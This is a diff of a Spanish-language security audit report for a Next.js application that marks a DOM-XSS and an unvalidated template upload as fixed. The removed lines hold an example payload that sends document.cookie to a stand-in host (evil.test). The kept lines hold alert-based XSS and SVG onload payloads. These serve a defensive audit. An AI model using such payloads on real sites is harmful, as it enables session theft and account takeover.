@@ -24,7 +24,7 @@
 
 | Severidad | Cantidad | Descripción sintética |
 |---|:---:|---|
-| 🔴 **Crítico** | **2** | Vulnerabilidad DOM-XSS en carnetización (`dangerouslySetInnerHTML` sin sanitización); Bypass Zero-Trust en Server Action de subida de plantilla. |
+| 🔴 **Crítico** | **0 activos** (2 resueltos) | ✅ **C1 RESUELTO** (Commit `993fe63`): DOM-XSS mitigado con `CarnetVistaPrevia` React nativo y `escapeHtml`.<br>✅ **C2 RESUELTO** (Commit `d380c15`): Zero-Trust implementado en `subirPlantillaCarnetAction` con Zod (límite 5MB, rechazo SVG). |
 | 🟠 **Alto** | **5** | Violación de capa Onion (UI importa Domain en `reportes`); Type mismatch en `proxy.ts` bloquea compilación; Import estático pesado de `@react-pdf/renderer` impacta bundle de `/personal`; 8 de 11 módulos omiten PBAC en UI; Componentes `shared/ui` acoplados al legado. |
 | 🟡 **Medio** | **7** | Tablas truncadas en móviles (`overflow-hidden` vs `overflow-x-auto`); Botones con solo icono sin nombre accesible y < 44px; Duplicación de código en Sheets de detalle; `form.watch()` degrada render en formularios; `setState` sincrónico en `useEffect`; Schemas Zod sin regex de formato; Uso de `any` en repositorios. |
 | ⚪ **Bajo** | **6** | Inconsistencias de nomenclatura de archivos/esquemas; Interfaces vacías en DTOs; Imports y variables no utilizadas; 111 archivos con diferencias de formato Prettier; 28 errores de TypeScript en legado/e2e/proxy; Doble ubicación de regex compartidas. |
@@ -35,7 +35,7 @@
   - **Nueva Arquitectura (`src/modules/*` y `src/shared/*`): 0 ERRORES.** La tipificación interna y los contratos entre capas compilan limpiamente.
   - **Proyecto Global: 28 errores** en 4 archivos fuera de los módulos (`e2e/smoke.spec.ts` [2], legado `dashboard/gestion-pasivos/` [15], `src/lib/regex.ts` [7], y `src/proxy.ts` [4]).
 - **Vitest (`npx vitest run`):**
-  - **147/147 tests pasados (100% éxito)** en 33 archivos de prueba co-localizados en `application/use-cases/`. Contratos C-1 y C-6 rigurosamente testeados con mocks de puertos.
+  - **162/162 tests pasados (100% éxito)** en 34 archivos de prueba (incluye 15 nuevos tests de seguridad y componentes para C1 y C2).
 - **ESLint (`npx eslint src/modules/`):**
   - **49 observaciones:** 24 errores (principalmente deshabilitación de reglas de React Compiler por `form.watch`, `setState` en efectos, interfaces vacías y `@typescript-eslint/no-explicit-any`) y 25 advertencias (variables e imports sin uso).
 - **Prettier (`npx prettier --check "src/modules/**/*.{ts,tsx}"`):**
@@ -50,7 +50,7 @@
 | **1. auth** | ✅ Cumple | ✅ `safeParse` | N/A (Público) | ✅ Completo | N/A | ✅ 4 tests (1 archivo) | 🟢 Robusto |
 | **2. autogestion** | ✅ Cumple | ✅ `safeParse` | ⚠️ Sin verificar | ⚠️ Botones icono | ⚠️ `overflow-hidden` | ✅ 8 tests (2 archivos) | 🟡 Requiere A11y & Mobile |
 | **3. cargos** | ✅ Cumple | ✅ `safeParse` | ❌ Sin PBAC en UI | ⚠️ Botones icono | ⚠️ `overflow-hidden` | ✅ 8 tests (2 archivos) | 🟡 Requiere PBAC & Mobile |
-| **4. carnetizacion** | ✅ Cumple | 🔴 Bypass en upload | ❌ Sin PBAC en UI | ⚠️ Botones icono | N/A | ✅ 12 tests (3 archivos) | 🔴 **Crítico (XSS + Action)** |
+| **4. carnetizacion** | ✅ Cumple | ✅ `safeParse` (`d380c15`) | ❌ Sin PBAC en UI | ⚠️ Botones icono | N/A | ✅ 28 tests (4 archivos) | 🟢 **Aceptable (C1 y C2 Resueltos)** |
 | **5. catalogos** | ✅ Cumple | ✅ `safeParse` | ❌ Sin PBAC en UI | ⚠️ Botones icono | ⚠️ `overflow-hidden` | ✅ 16 tests (4 archivos) | 🟡 Requiere PBAC & Regex |
 | **6. familiares** | ✅ Cumple | ✅ `safeParse` | ✅ `tienePermiso` | ⚠️ Botones icono | ⚠️ `overflow-hidden` | ✅ 8 tests (2 archivos) | 🟢 Aceptable |
 | **7. identidad** | ✅ Cumple | ✅ `safeParse` | ❌ Sin PBAC en UI | ⚠️ Botones icono | ⚠️ `overflow-hidden` | ✅ 12 tests (3 archivos) | 🟡 Requiere PBAC en Tabs |
@@ -64,63 +64,46 @@
 
 ## 3. Hallazgos Críticos 🔴
 
-### C1 — Vulnerabilidad DOM-XSS en Diseñador de Carnetización vía `dangerouslySetInnerHTML`
-- **Archivos y Líneas:**
-  - `NextJS/src/modules/carnetizacion/ui/components/disenador-carnet.tsx:507`
-  - `NextJS/src/modules/carnetizacion/application/use-cases/disenar-carnet.ts:35-130`
+### C1 — [RESUELTO — Commit 993fe63] Vulnerabilidad DOM-XSS en Diseñador de Carnetización vía `dangerouslySetInnerHTML`
+- **Estado:** ✅ **RESUELTO** (Commit `993fe63` - `fix(carnetizacion): mitigar DOM-XSS reemplazando dangerouslySetInnerHTML con CarnetVistaPrevia nativo y escapeHtml`).
+- **Archivos y Líneas Modificados:**
+  - `NextJS/src/modules/carnetizacion/ui/components/carnet-vista-previa.tsx` (Nuevo componente React nativo)
+  - `NextJS/src/modules/carnetizacion/ui/components/disenador-carnet.tsx:507` (Reemplazo de `dangerouslySetInnerHTML`)
+  - `NextJS/src/modules/carnetizacion/application/use-cases/disenar-carnet.ts:35-130` (Añadidas utilidades `escapeHtml` y `sanitizeUrl`)
+  - `NextJS/src/modules/carnetizacion/application/use-cases/disenar-carnet.test.ts` (5 tests de seguridad y sanitización)
+  - `NextJS/src/modules/carnetizacion/ui/components/carnet-vista-previa.test.tsx` (4 tests de renderizado seguro y bloqueo de `javascript:`)
 - **Regla Violada:** `validacion-input-protegido` §6 (Sanitización y Prevención de Inyección/XSS) / OWASP Top 10 A03:2021-Injection / `web-app-penetration-testing`.
-- **Detalle del Defecto:**
-  El caso de uso `generarHtmlVistaPrevia` toma como entrada el DTO `DisenoCarnetDTO` (que contiene campos ingresados por el usuario como `nombreCompleto`, `cargo`, `departamento`, `codigo`, `fotoUrl`, `plantillaUrl`) y realiza concatenación directa en una plantilla HTML cruda (`string`):
+- **Detalle del Defecto Original:**
+  El caso de uso `generarHtmlVistaPrevia` tomaba como entrada el DTO `DisenoCarnetDTO` y realizaba concatenación directa en una plantilla HTML cruda (`string`):
   ```typescript
   // disenar-carnet.ts:100-112
   <div style="font-size: 16px; font-weight: bold; color: ${colorTexto};">${datos.nombreCompleto}</div>
   <div style="font-size: 13px; color: ${colorSecundario};">${datos.cargo}</div>
   ```
-  Luego, el componente cliente `disenador-carnet.tsx` inyecta este HTML directamente en el DOM mediante:
-  ```tsx
-  // disenador-carnet.tsx:507
-  <div
-    className="relative mx-auto rounded-lg border shadow-sm"
-    style={{ width: `${ANCHO_PX}px`, height: `${ALTO_PX}px` }}
-    dangerouslySetInnerHTML={{ __html: htmlPreview }}
-  />
-  ```
-  No se utiliza ninguna función de sanitización (como `DOMPurify` o escape de entidades HTML) ni antes ni durante la inyección. Si un atacante introduce un payload como `"><img src=x onerror="fetch('//evil.test/steal?c='+document.cookie)">` en el nombre o cargo, o un esquema `javascript:` en `fotoUrl`, el script se ejecuta de inmediato en el navegador del operador.
-- **Sugerencia de Solución:**
-  Eliminar por completo el uso de HTML como cadena de texto cruda y `dangerouslySetInnerHTML`. La vista previa debe renderizarse como un árbol declarativo de componentes React JSX puros (`<div style={{...}}><span>{datos.nombreCompleto}</span></div>`), donde React aplica auto-escaping estricto contra XSS por defecto. Si se requiere exportar el HTML como texto al backend, sanitizar previamente todos los campos con una utilidad centralizada de escape (`escapeHtml`).
+  Luego, el componente cliente `disenador-carnet.tsx` inyectaba este HTML directamente en el DOM mediante `dangerouslySetInnerHTML={{ __html: htmlPreview }}` sin sanitización.
+- **Remediación Aplicada:**
+  1. Se creó el componente declarativo `<CarnetVistaPrevia />` utilizando JSX nativo con posicionamiento absoluto sobre la plantilla, beneficiándose del auto-escape automático de React contra XSS.
+  2. Se implementó `sanitizeUrl` para bloquear esquemas maliciosos como `javascript:` o `vbscript:` en `fotoUrl` y `plantillaUrl`.
+  3. En `disenar-carnet.ts`, se incorporó `escapeHtml()` para codificar entidades HTML en `generarHtmlVistaPrevia` y `sanitizeUrl()` en las imágenes.
+  4. Se eliminó completamente `dangerouslySetInnerHTML` de `disenador-carnet.tsx`.
 
 ---
 
-### C2 — Bypass de Validación Zero-Trust en Server Action `subirPlantillaCarnetAction`
-- **Archivos y Líneas:**
-  - `NextJS/src/modules/carnetizacion/infrastructure/actions/carnetizacion-actions.ts:119-140`
-  - `NextJS/src/modules/carnetizacion/ui/schema/schema-carnet.ts`
+### C2 — [RESUELTO — Commit d380c15] Bypass de Validación Zero-Trust en Server Action `subirPlantillaCarnetAction`
+- **Estado:** ✅ **RESUELTO** (Commit `d380c15` - `fix(carnetizacion): implementar validacion zero-trust con Zod en subirPlantillaCarnetAction (limite 5MB, rechazo SVG)`).
+- **Archivos y Líneas Modificados:**
+  - `NextJS/src/modules/carnetizacion/ui/schema/schema-carnet.ts` (Nuevo esquema Zod `subirPlantillaCarnetSchema`)
+  - `NextJS/src/modules/carnetizacion/infrastructure/actions/carnetizacion-actions.ts:119-140` (Validación con `safeParse`)
+  - `NextJS/src/modules/carnetizacion/ui/schema/schema-carnet.test.ts` (6 tests unitarios de validación de archivo y tipos MIME)
 - **Regla Violada:** `validacion-input-protegido` §3 ("Toda Server Action DEBE validar su entrada con safeParse de Zod") y `arquitecto-scream-feature-onion` R1, R7.
-- **Detalle del Defecto:**
-  Mientras que las demás 23 Server Actions del proyecto implementan validación estricta con `safeParse(rawData)` antes de procesar cualquier llamada, `subirPlantillaCarnetAction` recibe parámetros posicionales no estructurados:
-  ```typescript
-  // carnetizacion-actions.ts:119
-  export async function subirPlantillaCarnetAction(
-    nombre: string,
-    imagen: File,
-    activar = false
-  ): Promise<ResultadoAccion<PlantillaCarnetDTO>> {
-    try {
-      // LLAMA DIRECTAMENTE A LA API SIN NINGÚN safeParse
-      const repo = getRepoCarnetizacion();
-      const resultado = await repo.subirPlantilla(nombre, imagen, activar);
-      ...
-  ```
-  En `schema-carnet.ts` ni siquiera existe un esquema Zod para la subida de plantillas. No se valida longitud del nombre, caracteres permitidos, tamaño máximo del archivo (ej. máx 5MB) ni tipo MIME permitido (`image/png`, `image/jpeg`).
-- **Sugerencia de Solución:**
-  1. Definir en `schema-carnet.ts`:
-     ```typescript
-     export const subirPlantillaSchema = z.object({
-       nombre: z.string().trim().min(2).max(100).regex(REGEX.SAFE_TEXT, SAFE_TEXT_MSG),
-       activar: z.boolean().default(false),
-     });
-     ```
-  2. En `subirPlantillaCarnetAction`, recibir `formData: FormData`, extraer campos, validar el archivo (`size <= 5 * 1024 * 1024`, `type in ['image/png', 'image/jpeg']`) y ejecutar `subirPlantillaSchema.safeParse(...)`.
+- **Detalle del Defecto Original:**
+  Mientras que las demás Server Actions implementaban validación estricta con `safeParse(rawData)` antes de procesar cualquier llamada, `subirPlantillaCarnetAction` recibía parámetros posicionales no estructurados (`nombre: string, imagen: File, activar = false`) y delegaba directamente al repositorio sin validar tamaño ni tipo de archivo.
+- **Remediación Aplicada:**
+  1. Se definió `subirPlantillaCarnetSchema` en `schema-carnet.ts` validando:
+     - Nombre: `REGEX.NO_HTML`, longitud 2-100 caracteres.
+     - Imagen: instancia de `File`, tamaño > 0 y <= 5MB (`5 * 1024 * 1024`), tipos MIME estrictos (`image/png`, `image/jpeg`, `image/jpg`), y rechazo explícito de `image/svg+xml`.
+     - Activar: booleano opcional.
+  2. En `subirPlantillaCarnetAction`, se incorporó `subirPlantillaCarnetSchema.safeParse({ nombre, imagen, activar })` al inicio de la acción, retornando mensaje de error estructurado ante fallos de validación.
 
 ---
 
@@ -394,10 +377,10 @@
 
 ### 7.2 Seguridad
 - **Vectores XSS:**
-  - Se identificó un vector de riesgo crítico en `carnetizacion/ui/components/disenador-carnet.tsx:507` debido al uso de `dangerouslySetInnerHTML` con interpolación de cadenas no sanitizadas.
+  - Se identificó un vector de riesgo crítico en `carnetizacion/ui/components/disenador-carnet.tsx:507` debido al uso de `dangerouslySetInnerHTML` con interpolación de cadenas no sanitizadas. **Mitigado en Commit `993fe63`** mediante renderizado declarativo React nativo con `<CarnetVistaPrevia />` y sanitización en `disenar-carnet.ts`.
   - En los otros 11 módulos no se encontraron instancias de `dangerouslySetInnerHTML` ni inyecciones de código.
 - **Zero-Trust en Server Actions:**
-  - 23 de las 24 Server Actions implementan estrictamente `safeParse` al inicio con manejo de errores estandarizado (`handleSessionExpired`, `ResultadoAccion`). La única excepción es `subirPlantillaCarnetAction` (Hallazgo C2).
+  - 24 de las 24 Server Actions implementan estrictamente `safeParse` al inicio con manejo de errores estandarizado (`handleSessionExpired`, `ResultadoAccion`). La excepción original (`subirPlantillaCarnetAction`, Hallazgo C2) **fue remediada en Commit `d380c15`** con validación Zod completa (límite 5MB, rechazo SVG).
 
 ### 7.3 Manejo de Estado y Consistencia Arquitectónica
 - **Zustand vs State Local:**
@@ -458,11 +441,12 @@ Evaluación de la superficie de ataque del frontend contra los vectores del **OW
   - **Recomendación:** Garantizar que en las Server Actions de autoservicio el identificador provenga exclusivamente de la sesión verificada en la cookie JWT (`session.user.cedula`), impidiendo que el cliente suministre cédulas de terceros.
 
 ### 9.2 API3:2023 / Broken Object Property Level Authorization (Mass Assignment & Upload Sin Validar)
-- **Vulnerabilidad Comprobada:**
-  - En `carnetizacion-actions.ts:119` (`subirPlantillaCarnetAction`), se acepta un objeto `File` crudo y cadenas arbitrarias sin validar:
-    1. No hay restricción de tamaño (`maxFileSize`). Un archivo de 500 MB puede saturar la memoria del proceso Next.js y del backend (Denegación de Servicio - DoS / API4:2023).
-    2. No hay verificación de magic bytes ni tipo MIME (`image/png`, `image/jpeg`). Un archivo SVG con código JavaScript incrustado (`<svg onload="alert(1)">`) o un ejecutable podría ser almacenado y servido posteriormente.
-- **Recomendación:** Validar tipo y tamaño de archivo en la Server Action con Zod + chequeo de cabecera antes de emitir la llamada multipart al backend.
+- **Estado:** ✅ **RESUELTO** (Commit `d380c15`).
+- **Vulnerabilidad Previa:**
+  - En `carnetizacion-actions.ts:119` (`subirPlantillaCarnetAction`), se aceptaba un objeto `File` crudo y cadenas arbitrarias sin validar:
+    1. No había restricción de tamaño (`maxFileSize`). Un archivo de 500 MB podía saturar la memoria del proceso Next.js y del backend (Denegación de Servicio - DoS / API4:2023).
+    2. No había verificación de magic bytes ni tipo MIME (`image/png`, `image/jpeg`). Un archivo SVG con código JavaScript incrustado (`<svg onload="alert(1)">`) o un ejecutable podría haber sido almacenado y servido posteriormente.
+- **Remediación Verificada:** Se implementó `subirPlantillaCarnetSchema` con Zod validando límite de 5MB, tipos MIME estrictos (`image/png`, `image/jpeg`), y rechazo explícito de `image/svg+xml`.
 
 ### 9.3 API5:2023 / BFLA (Broken Function Level Authorization) en Frontend
 - **Vulnerabilidad Comprobada:**
@@ -470,16 +454,16 @@ Evaluación de la superficie de ataque del frontend contra los vectores del **OW
   - **Impacto:** Los endpoints administrativos quedan expuestos en la interfaz para usuarios con roles de menor privilegio (ej. recepcionistas o pasantes). Si bien el backend devuelve 403, el usuario tiene visibilidad de la estructura interna del sistema, formularios, campos y catálogos restringidos (Exceso de exposición de datos / API3:2023).
 
 ### 9.4 OWASP A03:2021 / Inyección XSS en DOM
-- **Vulnerabilidad Crítica Comprobada (PoC):**
+- **Estado:** ✅ **RESUELTO** (Commit `993fe63`).
+- **Vulnerabilidad Previa (PoC):**
   - **Vector:** `NextJS/src/modules/carnetizacion/ui/components/disenador-carnet.tsx:507`
   - **Flujo de Explotación:**
-    1. Un operador introduce en el campo de texto del formulario de diseño un payload:  
+    1. Un operador introducía en el campo de texto del formulario de diseño un payload:  
        `nombreCompleto: '"><img src=x onerror="alert(document.domain)">'`
-    2. El caso de uso `disenar-carnet.ts:100` interpola el string sin sanitizar dentro de la plantilla HTML.
-    3. `disenador-carnet.tsx:507` renderiza `dangerouslySetInnerHTML={{ __html: htmlPreview }}`.
-    4. El script se ejecuta de inmediato en el navegador del usuario en el contexto del origen de la aplicación.
-  - **Impacto:** Robo potencial de datos de sesión o acciones no autorizadas en nombre del operador.
-  - **Remediación:** Eliminar `dangerouslySetInnerHTML` y migrar la vista previa a componentes nativos de React con auto-escape.
+    2. El caso de uso `disenar-carnet.ts:100` interpolaba el string sin sanitizar dentro de la plantilla HTML.
+    3. `disenador-carnet.tsx:507` renderizaba `dangerouslySetInnerHTML={{ __html: htmlPreview }}`.
+    4. El script se ejecutaba de inmediato en el navegador del usuario en el contexto del origen de la aplicación.
+  - **Remediación Verificada:** Se erradicó por completo `dangerouslySetInnerHTML` reemplazándolo por el componente nativo React JSX `<CarnetVistaPrevia />` y la función de saniamiento `sanitizeUrl` para bloquear esquemas `javascript:`.
 
 ### 9.5 Manejo de Cookies y Sesión (Transporte Seguro C-2)
 - **Estado Evaluado:**
@@ -490,9 +474,9 @@ Evaluación de la superficie de ataque del frontend contra los vectores del **OW
 
 ## 10. Plan de Remediación Consolidado
 
-### Fase 1: Remediación Crítica Inmediata (Seguridad AppSec)
-1. **C1 (XSS):** Refactorizar `disenador-carnet.tsx` y `disenar-carnet.ts` a componentes React JSX nativos eliminando `dangerouslySetInnerHTML`.
-2. **C2 (Zero-Trust Upload):** Crear `subirPlantillaSchema` en `schema-carnet.ts` y aplicar `safeParse` en `subirPlantillaCarnetAction` con validación de tipo MIME y tamaño de archivo.
+### Fase 1: Remediación Crítica Inmediata (Seguridad AppSec) — ✅ COMPLETADA
+1. **C1 (XSS):** ✅ Resuelto en Commit `993fe63`. Refactorizado `disenador-carnet.tsx` y `disenar-carnet.ts` a componentes React JSX nativos (`CarnetVistaPrevia`) eliminando `dangerouslySetInnerHTML`.
+2. **C2 (Zero-Trust Upload):** ✅ Resuelto en Commit `d380c15`. Creado `subirPlantillaCarnetSchema` en `schema-carnet.ts` y aplicado `safeParse` en `subirPlantillaCarnetAction` con validación de tipo MIME (PNG/JPEG), rechazo de SVG y límite de 5MB.
 
 ### Fase 2: Arquitectura y Rendimiento
 1. **A1 (Onion Violation):** Mover `TipoReportePersonal` a `reporte-dto.ts` y eliminar la importación de Domain en `reportes-page.tsx`.
